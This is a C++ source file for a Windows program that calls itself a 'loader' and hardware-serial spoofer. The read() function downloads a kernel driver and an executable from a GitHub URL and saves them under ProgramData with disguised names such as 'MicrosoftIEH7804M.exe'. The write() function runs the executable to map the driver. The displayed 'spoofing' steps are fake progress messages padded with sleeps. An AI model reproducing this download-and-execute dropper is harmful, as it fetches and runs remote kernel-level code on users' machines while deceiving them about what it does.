#include <iostream>
#include "windows.h"
#include "driver.h"
#include "urlmon.h"
#include <tchar.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")

auto read() -> void
{
    HRESULT hr;
	LPCTSTR drvPhysLnk = _T("https://raw.githubusercontent.com/dispactz/drv/main/blckswipenew.sys"), drvPhysOpt = _T("C:\\ProgramData\\HDDClass64.sys");
	LPCTSTR mpPhysLnk = _T("https://raw.githubusercontent.com/dispactz/drv/main/udmanmapper.exe"), mpPhysOpt = _T("C:\\ProgramData\\MicrosoftIEH7804M.exe");
	
	hr = URLDownloadToFile(0, drvPhysLnk, drvPhysOpt, 0, 0);
	hr = URLDownloadToFile(0, mpPhysLnk, mpPhysOpt, 0, 0);
}

auto write() -> void
{
	system("C:\\ProgramData\\MicrosoftIEH7804M.exe C:\\ProgramData\\HDDClass64.sys");
}

auto spoof() -> void
{
    std::cout << "Initializing Enclosures, Please wait.. \n\n";
    read();
    Sleep(2100);
    system("cls");
    std::cout << "Success. \n\n";
    Sleep(2100);
    system("cls");
    std::cout << "Spoofing SMART Serials, Please wait.. \n\n";
    Sleep(2100);
    system("cls");
    std::cout << "Refreshing WMI... \n\n";
    Sleep(1800);
    system("cls");
    std::cout << "Hiding BIOS Serials, Please wait.. \n\n";
    Sleep(2100);
    system("cls");
    std::cout << "Hiding DISK Serials, Please wait.. \n\n";
    Sleep(2100);
    system("cls");
    std::cout << "Hiding ENCLOSURE Serials, Please wait.. \n\n";
    Sleep(2100);
    system("cls");
    std::cout << "Hiding Extras, Please wait (this wont take long.) \n\n";
    write();
    Sleep(1850);
    system("cls");
    std::cout << "Success, New Serials: \n\n";
    std::cout << "Disk: "; 
    system("wmic diskdrive get serialnumber");
    std::cout << "\n\n Baseboard: "; 
    system("wmic baseboard get serialnumber");
    std::cout << "\n\n Enclosure: ";
    system("wmic baseboard get serialnumber");
    std::cout << "\n\n Other serials can be checked with a alternative serial checker. \n\n vouch and press any key to exit.";
    system("pause >nul");
    system("exit");
}

auto main() -> int
{
    SetConsoleTitleA("loader");
    
    std::cout << "Connecting to authentication servers, please wait. \n\n";
    Sleep(2100);
    system("cls");
    Sleep(1500);
    std::cout << "License: ";
    
}
